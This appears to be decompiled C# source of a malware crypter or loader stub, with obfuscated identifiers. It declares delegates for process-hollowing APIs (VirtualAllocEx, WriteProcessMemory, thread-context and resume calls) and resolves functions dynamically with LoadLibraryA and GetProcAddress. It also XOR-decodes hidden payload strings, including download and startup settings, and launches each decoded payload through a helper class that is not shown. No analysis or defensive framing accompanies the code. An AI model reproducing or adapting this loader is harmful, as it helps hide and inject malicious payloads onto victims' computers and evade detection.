using System;
using System.Runtime.InteropServices;

namespace fQxuTtw;

public class ClaZx
{
	public delegate IntPtr pBhpkEzwcPDh(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

	public delegate uint JywoSMKsxxae(IntPtr hProcess, IntPtr lpBaseAddress);

	public delegate int igQiXSlVkUiZ(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, IntPtr lpNumberOfBytesWritten);

	public delegate int jzNRdJaAITlI(IntPtr hThread, IntPtr lpContext);

	public delegate int tDVuAiMQBdge(IntPtr hThread, IntPtr lpContext);

	public delegate uint OrykDIXOqwes(IntPtr hThread, IntPtr SuspendCount);

	public static string namenorm;

	public static string namenet;

	public static string eofstr;

	public static string otfiles;

	public static string downex;

	public static string visitwebsites;

	public static string startupstring;

	public static string ExtraSt;

	private static byte[] startupbytes = null;

	private static string[] spls = new string[1] { "xVlVxqkTpPDvOfIPDYIr" };

	public static string appdat;

	public static string fileNamex;

	public static string[] extrastrings;

	public static string Pthzz;

	public static IntPtr Gepoad;

	public static Type Teaz;

	public static object obj;

	private static IntPtr Hmod;

	private static string method2;

	public static void Arraycopy(byte[] exeBuffer, int toint, byte[] imshea)
	{
		Array.Copy(exeBuffer, toint, imshea, 0, imshea.Length);
	}

	private static int xorer(int input1, int input2)
	{
		input1 ^= input2;
		return input1;
	}

	public static byte[] enCode(byte[] mesgg, byte[] Keyyy)
	{
		byte[] array = (byte[])mesgg.Clone();
		for (int i = 0; i < 5; i++)
		{
			for (int j = 0; j < array.Length; j++)
			{
				array[j] = (byte)xorer(array[j], Keyyy[j % Keyyy.Length]);
				for (int k = 0; k < Keyyy.Length; k++)
				{
					int input = xorer(Keyyy[k] << i, k) + j;
					array[j] = (byte)xorer(array[j], input);
				}
			}
		}
		return array;
	}

	private static void Main(string[] args)
	{
		Memex.CLOZ();
		appdat = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		Trilogy();
	}

	private static void decrs()
	{
		try
		{
			namenorm = Memex.CCC(namenorm);
			namenet = Memex.CCC(namenet);
			eofstr = Memex.CCC(eofstr);
			otfiles = Memex.CCC(otfiles);
			downex = Memex.CCC(downex);
			visitwebsites = Memex.CCC(visitwebsites);
			extrastrings = Memex.CCC(ExtraSt).Split(new char[1] { '|' });
		}
		catch
		{
		}
	}

	public static void Trilogy()
	{
		try
		{
			startupbytes = enCode(Memex.BBB(startupstring), Memex.BBB(Memex.pass));
		}
		catch
		{
		}
		decrs();
		if (!(namenorm != string.Empty))
		{
			return;
		}
		fileNamex = extrastrings[9];
		string[] array = namenorm.Split(spls, StringSplitOptions.RemoveEmptyEntries);
		foreach (string s in array)
		{
			try
			{
				Memex.Runoa(Memex.BBB(s), fileNamex);
			}
			catch
			{
			}
		}
	}

	private static int RandomNumber(int minnn, int maxxx)
	{
		Random random = new Random();
		if (minnn == 1)
		{
			Gepoad = GetProcAddress(Hmod, method2);
		}
		return random.Next(minnn, maxxx);
	}

	public static T CreateAPI<T>(string name, string method)
	{
		Hmod = LoadLibraryA(name);
		method2 = method;
		RandomNumber(1, 26);
		Teaz = typeof(T);
		Memex.ZOL();
		return (T)obj;
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern IntPtr LoadLibraryA(string lpFileName);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, byte[] lpStartupInfo, int[] lpProcessInfo);
}
